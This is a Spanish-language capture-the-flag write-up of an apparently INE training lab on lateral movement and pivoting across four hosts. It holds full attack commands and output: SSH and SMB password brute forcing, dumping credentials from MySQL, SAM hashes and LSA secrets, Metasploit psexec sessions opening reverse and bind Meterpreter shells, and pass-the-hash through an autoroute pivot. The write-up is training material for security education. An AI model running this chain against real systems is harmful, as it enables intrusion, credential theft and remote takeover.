
# Lateral Movement & Pivoting CTF I

Este laboratorio se centra en el movimiento lateral y el pivoting dentro de una red comprometida para escalar el acceso a través de múltiples máquinas. Aprovecharás las vulnerabilidades de las credenciales, explotarás servicios abiertos y usarás credenciales obtenidas previamente para moverte por diferentes sistemas.&#x20;

Tu objetivo es capturar todas las flags ocultas navegando con éxito por cada máquina objetivo.

***

## <mark style="color:$primary;">Task 1</mark>

> Explotar los servicios abiertos en target1.ine.local para obtener acceso inicial.

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.3        INE
127.0.0.1 AttackDefense-Kali
192.176.241.2   INE
10.10.37.4      INE
192.176.241.2 INE
192.176.241.3 target1.ine.local
192.176.241.4 target2.ine.local
10.2.21.175    target3.ine.local
10.2.23.172    target4.ine.local
```

Tenemos conectividad con `target1`, `target2`, y `target3`, pero no con `target4`, a la que tendremos que acceder con pivoting.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target1.ine.local

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.22.04.1
MAC Address: 02:42:C0:53:6A:03 (Unknown)
```

Solo tenemos abierto el puerto 22 y el 3306.

### Bruteforce de SSH

{% hint style="info" %}
La pista nos indica que hay un usuario **john**, con el que probaremos la fuerza bruta.
{% endhint %}

```bash
┌──(root㉿INE)-[~]
└─# hydra -l john -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt target1.ine.local ssh -t4

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 18:08:24
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3957 login tries (l:1/p:3957), ~990 tries per task
[DATA] attacking ssh://target1.ine.local:22/
[22][ssh] host: target1.ine.local   login: john   password: password1
1 of 1 target successfully completed, 1 valid password found
```

Tenemos la contraseña de john: `password1`

### Acceso SSH

```bash
┌──(root㉿INE)-[~]
└─# ssh john@target1.ine.local                                                                                                
john@target1.ine.local's password: 

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Apr 15 12:40:35 2026 from 192.83.106.2

john@target1:~$ whoami
john
```

### Flag 1

```bash
john@target1:~$ ls
flag.txt

john@target1:~$ cat flag.txt 
FLAG1_f29f689adcfe4e5f9860a25f********
```

En la home observamos que hay otro usuario Mike, al que no tenemos acceso:

```bash
john@target1:/home$ ls
john  mike
```

***

## <mark style="color:$primary;">Task 2</mark>

> Enumera las bases de datos en target1.ine.local para recuperar credenciales ocultas.

### Acceso interno a MySQL

```bash
john@target1:~$ mysql -u john -p -h 127.0.0.1
Enter password: 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 43
Server version: 8.0.41-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Encontramos una base de datos `usersinfo`:

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| usersinfo          |
+--------------------+
3 rows in set (0.01 sec)

mysql> use usersinfo;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Y extraemos la información de las tablas que contienen usuarios:

```sql
mysql> show tables;
+---------------------+
| Tables_in_usersinfo |
+---------------------+
| target2_users       |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from target2_users;
+----------+---------------+
| username | password      |
+----------+---------------+
| alice    | C@ntcr@ck!t19 |
+----------+---------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+---------------+
| username | password      |
+----------+---------------+
| mike     | Uncr@ckable67 |
+----------+---------------+
1 row in set (0.00 sec)
```

Obtenemos 2 nuevas credenciales:

* Alice: `C@ntcr@ck!t19`
* Mike: `Uncr@ckable67`

### Flag 2

Cambiamos al usuario mike y obtenemos la `flag 2` en su home:

```bash
john@target1:~$ su mike
Password:

mike@target1:/home/john$ cd ../mike/
mike@target1:~$ ls
flag.txt
mike@target1:~$ cat flag.txt 
FLAG2_194adde431a44ba6a3b78151********
```

***

## <mark style="color:$primary;">Task 3</mark>

> Aprovechar un servicio abierto en target2.ine.local para escalar el acceso.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target2.ine.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:53:6A:04 (Unknown)
```

Solo encontramos el puerto 22 abierto.

### Acceso SSH

Conseguimos acceder por SSH con las credenciales de Alice que encontramos en la base de datos:

```bash
┌──(root㉿INE)-[~]
└─# ssh alice@target2.ine.local                                                                                               
alice@target2.ine.local's password:

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Apr 15 12:52:48 2026 from 192.83.106.2
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

alice@target2:~$ whoami
alice
```

### Flag 3

```bash
alice@target2:~$ ls
flag.txt
alice@target2:~$ cat flag.txt 
FLAG3_b6e19bfae4bb4625b17a1a66********
```

### Escalada de privilegios

Además con Alice podríamos elevar privilegios fácilmente ya que puede ejecutar cualquier comando, aunque en nuestro caso no nos sirve para seguir explotando el lab:

```bash
alice@target2:/home$ sudo -l
[sudo] password for alice:

Matching Defaults entries for alice on target2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alice may run the following commands on target2:
    (ALL : ALL) ALL
    
alice@target2:/home$ sudo su
root@target2:/home# whoami
root
```

***

## <mark style="color:$primary;">Task 4</mark>

> Explotar target3.ine.local para obtener credenciales de administrador.

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV target3.ine.local

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Nos encontramos una máquina `Windows Server`, con SMB expuesto.

### Escaneo dirigido a SMB

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV -p 445 --script smb-* target3.ine.local

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.2.26.11\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.2.26.11\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.2.26.11\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\10.2.26.11\SHARED: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
| smb-brute: 
|_  guest:<blank> => Valid credentials, account disabled
|_smb-print-text: false
|_smb-flood: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: EC2AMAZ-3SC2DRK
|   NetBIOS computer name: EC2AMAZ-3SC2DRK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-15T12:34:55+00:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

Observamos que en `smb-protocols` tenemos varios disponibles, y no obtenemos nada más de información con los scripts.

### Bruteforce de SMB

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt

<----SNIP---->
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] EC2AMAZ-3SC2DRK\administrator:14344 STATUS_LOGON_FAILURE 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] EC2AMAZ-3SC2DRK\administrator:autumn STATUS_LOGON_FAILURE 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] EC2AMAZ-3SC2DRK\administrator:mendoza STATUS_LOGON_FAILURE 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] EC2AMAZ-3SC2DRK\administrator:sq!us3r STATUS_LOGON_FAILURE 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] EC2AMAZ-3SC2DRK\administrator:adminpasswd STATUS_LOGON_FAILURE 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
```

Bingo! Encontramos la contraseña del administrador: `raspberry`

#### Conexión RDP

Con esas credenciales nos podríamos conectar por RDP para explotar el sistema Windows desde dentro con Powershell, etc...

```bash
┌──(root㉿INE)-[~]
└─# xfreerdp /v:10.2.23.151 /u:administrator /p:raspberry /size:80%
```

### Enumeración de SMB

#### Usuarios

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p 'raspberry' --users   
                                                                      
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Windows Server 2019 Datacenter 17763 x64 (name:EC2AMAZ-3SC2DRK) (domain:EC2AMAZ-3SC2DRK) (signing:False) (SMBv1:True)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [-] Error enumerating domain users using dc ip target3.ine.local: socket connection error while opening: [Errno 111] Connection refused
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Trying with SAMRPC protocol
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Enumerated domain user(s)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\Administrator                  Built-in account for administering the computer/domain                                                                                                                                                   
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\auditor                        
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\DefaultAccount                 A user account managed by the system.
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\demo                           
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\Guest                          Built-in account for guest access to the computer/domain                                                                                                                                                 
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\rooty                          
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\ssm-user                       
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\student                        
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  EC2AMAZ-3SC2DRK\WDAGUtilityAccount             A user account managed and used by the system for Windows Defender Application Guard scenarios.                               
```

Encontramos algunos usuarios interesantes, además del administrador.

#### Shares

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p 'raspberry' --shares
                                                                      
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Windows Server 2019 Datacenter 17763 x64 (name:EC2AMAZ-3SC2DRK) (domain:EC2AMAZ-3SC2DRK) (signing:False) (SMBv1:True)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Enumerated shares
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Share           Permissions     Remark
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  -----           -----------     ------
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  ADMIN$          READ,WRITE      Remote Admin
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  C$              READ,WRITE      Default share
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  IPC$                            Remote IPC
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Shared                          
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Shared2                         
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Shared3   
```

#### Volcar LSA Secrets

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p 'raspberry' --lsa   
                                                                   
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Windows Server 2019 Datacenter 17763 x64 (name:EC2AMAZ-3SC2DRK) (domain:EC2AMAZ-3SC2DRK) (signing:False) (SMBv1:True)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Dumping LSA secrets
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  dpapi_machinekey:0x0694feb944cf506203a23c002eacd6148ce177a9
dpapi_userkey:0xf868441886d45f15d72f98403d4921c88d667496                                                                                               
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2                                                                                                                  
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Dumped 2 LSA secrets to /root/.cme/logs/EC2AMAZ-3SC2DRK_target3.ine.local_2026-05-08_003511.secrets and /root/.cme/logs/EC2AMAZ-3SC2DRK_target3.ine.local_2026-05-08_003511.cached
```

#### Volcar Hashes

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p 'raspberry' --sam
                                                                      
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Windows Server 2019 Datacenter 17763 x64 (name:EC2AMAZ-3SC2DRK) (domain:EC2AMAZ-3SC2DRK) (signing:False) (SMBv1:True)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Dumping SAM hashes
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Administrator:500:aad3b435b51404eeaad3b435b51404ee:cecadc1061009aedacc80a2de584a5f5:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  rooty:1009:aad3b435b51404eeaad3b435b51404ee:d33b15ba0f27dbf0fd56cd54b1db1ade:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  demo:1010:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  auditor:1011:aad3b435b51404eeaad3b435b51404ee:b31c6aa5660d6e87ee046b1bb5d0ff79:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  ssm-user:1012:aad3b435b51404eeaad3b435b51404ee:8c3d1769c112d8c6aa558edbc38754f2:::
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Added 9 SAM hashes to the database
```

### Impacket PSExec

```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.2.21.175
set SMBUser administrator
set SMBPass raspberry
exploit

[*] Started reverse TCP handler on 10.10.37.4:4444 
[*] 10.2.21.175:445 - Connecting to the server...
[*] 10.2.21.175:445 - Authenticating to 10.2.21.175:445 as user 'administrator'...
[*] 10.2.21.175:445 - Selecting PowerShell target
[*] 10.2.21.175:445 - Executing the payload...
[+] 10.2.21.175:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.2.21.175
[*] Meterpreter session 1 opened (10.10.37.4:4444 -> 10.2.21.175:49786) at 2026-04-15 19:48:04 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Flag 4

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2025-01-01 14:00:41 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-09-15 12:42:30 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:08:52 +0530  Boot
040777/rwxrwxrwx  0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-11-14 12:26:18 +0530  EFI
100666/rw-rw-rw-  55      fil   2025-02-26 13:23:16 +0530  Hash.txt
040777/rwxrwxrwx  0       dir   2020-05-13 23:28:09 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2020-11-07 13:17:23 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2025-01-01 13:47:15 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2025-01-01 13:54:07 +0530  Recovery
040777/rwxrwxrwx  0       dir   2024-12-31 16:59:14 +0530  Shared
040777/rwxrwxrwx  4096    dir   2020-11-07 12:06:43 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-01-01 14:00:24 +0530  Users
040777/rwxrwxrwx  0       dir   2020-11-07 13:19:05 +0530  Utilities
040777/rwxrwxrwx  16384   dir   2026-04-15 18:53:50 +0530  Windows
100444/r--r--r--  408692  fil   2020-09-09 10:03:42 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2026-04-15 18:44:17 +0530  flag4.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag4.txt 
3324cba31dd94237877ffb6*********
```

Además vemos un archivo `Hash.txt` con el hash de un usuario administrador:

```bash
meterpreter > cat Hash.txt 
Administrator: 5c4d59391f656d5958dab124********
```

***

## <mark style="color:$primary;">Task 5</mark>

> Realizar un pivoting desde target3.ine.local a target4.ine.local utilizando los hashes descubiertos.

### Ver redes internas

```powershell
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  8
============
Name         : Amazon Elastic Network Adapter
Hardware MAC : 02:2a:3d:dd:4d:55
MTU          : 1500
IPv4 Address : 10.2.21.175
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::9f4:c17f:1c6d:943c
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Observamos la red interna `10.2.21.0/24` que no era accesible desde el exterior.

### Ping Interno

Comprobamos que tenemos conectividad con la máquina `target4`:

```bash
meterpreter > shell
Process 3948 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\> ping 10.2.23.172

Pinging 10.2.23.172 with 32 bytes of data:
Reply from 10.2.23.172: bytes=32 time=1ms TTL=128
Reply from 10.2.23.172: bytes=32 time<1ms TTL=128
Reply from 10.2.23.172: bytes=32 time<1ms TTL=128
Reply from 10.2.23.172: bytes=32 time<1ms TTL=128

Ping statistics for 10.2.23.172:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
```

### Autoroute

<pre class="language-bash"><code class="lang-bash"><strong>meterpreter > bg
</strong><strong>use post/multi/manage/autoroute
</strong>set session 1
run

[*] Running module against EC2AMAZ-3SC2DRK
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.2.16.0/255.255.240.0 from host's routing table.
[*] Post module execution completed 
</code></pre>

### Ecaneo de puertos internos

```bash
use auxiliary/scanner/portscan/tcp
set rhosts 10.2.23.172
set threads 12
exploit

[+] 10.2.23.172:          - 10.2.23.172:135 - TCP OPEN
[+] 10.2.23.172:          - 10.2.23.172:139 - TCP OPEN
[+] 10.2.23.172:          - 10.2.23.172:445 - TCP OPEN
```

Tenemos SMB en el objetivo!

### Pass the Hash via PSExec

Usaremos el hash del administrador que encontramos antes para acceder. Utilizaremos la primera parte del hash dumpeado de la SAM y la segunda parte el hash NT encontrado en el archivo de `Hash.txt` en c:/:

```bash
┌──(root㉿INE)-[~]
└─# crackmapexec smb target3.ine.local -u administrator -p 'raspberry' --sam
                                                                      
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [*] Windows Server 2019 Datacenter 17763 x64 (name:EC2AMAZ-3SC2DRK) (domain:EC2AMAZ-3SC2DRK) (signing:False) (SMBv1:True)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] EC2AMAZ-3SC2DRK\administrator:raspberry (Pwn3d!)
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  [+] Dumping SAM hashes
SMB         target3.ine.local 445    EC2AMAZ-3SC2DRK  Administrator:500:aad3b435b51404eeaad3b435b51404ee:cecadc1061009aedacc80a2de584a5f5:::
```

* Primera parte: `aad3b435b51404eeaad3b435b51404ee`

```bash
meterpreter > cat Hash.txt 
Administrator: 5c4d59391f656d5958dab124ffeabc20
```

* Segunda parte: `5c4d59391f656d5958dab124ffeabc20`

#### Hash final

```
aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20
```

#### Metasploit PSExec

{% hint style="danger" %}
IMPORTANTE: Como estamos atacando una máquina interna por pivoting el payload debe ser `windows/meterpreter/bind_tcp`, en la que nosotros nos conectamos a la máquina y no al revés.
{% endhint %}

```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.2.23.172
set smbuser administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20
set payload windows/meterpreter/bind_tcp
exploit

[*] 10.2.23.172:445 - Connecting to the server...
[*] 10.2.23.172:445 - Authenticating to 10.2.23.172:445 as user 'administrator'...
[*] 10.2.23.172:445 - Selecting PowerShell target
[*] 10.2.23.172:445 - Executing the payload...
[+] 10.2.23.172:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 10.2.23.172:4444
[*] Sending stage (176198 bytes) to 10.2.23.172
[*] Meterpreter session 5 opened (10.2.21.175:50588 -> 10.2.23.172:4444 via session 1) at 2026-04-15 20:12:45 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Flag 5

```powershell
meterpreter > cd C:/
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2025-02-03 14:20:53 +0530  $Recycle.Bin
100666/rw-rw-rw-  0       fil   2024-01-10 10:12:09 +0530  $WINRE_BACKUP_PARTITION.MARKER
040777/rwxrwxrwx  0       dir   2025-01-16 01:54:37 +0530  $WinREAgent
100666/rw-rw-rw-  1       fil   2021-05-08 13:44:33 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2025-01-16 02:03:31 +0530  Boot
040777/rwxrwxrwx  0       dir   2021-08-19 05:04:55 +0530  Documents and Settings
000000/---------  0       fif   1970-01-01 05:30:00 +0530  DumpStack.log.tmp
040777/rwxrwxrwx  0       dir   2021-08-19 11:54:49 +0530  EFI
040777/rwxrwxrwx  0       dir   2021-05-08 13:50:24 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2025-02-03 14:11:24 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2025-02-24 22:15:02 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2025-02-03 14:11:34 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2025-02-03 14:17:00 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2024-10-09 07:07:07 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-02-03 14:20:10 +0530  Users
040777/rwxrwxrwx  16384   dir   2025-02-24 22:15:02 +0530  Windows
100444/r--r--r--  440698  fil   2025-01-16 01:59:06 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2026-04-15 19:39:03 +0530  flag5.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
```

```bash
meterpreter > cat flag5.txt 
1078995827a34f7bab3ec420********
```
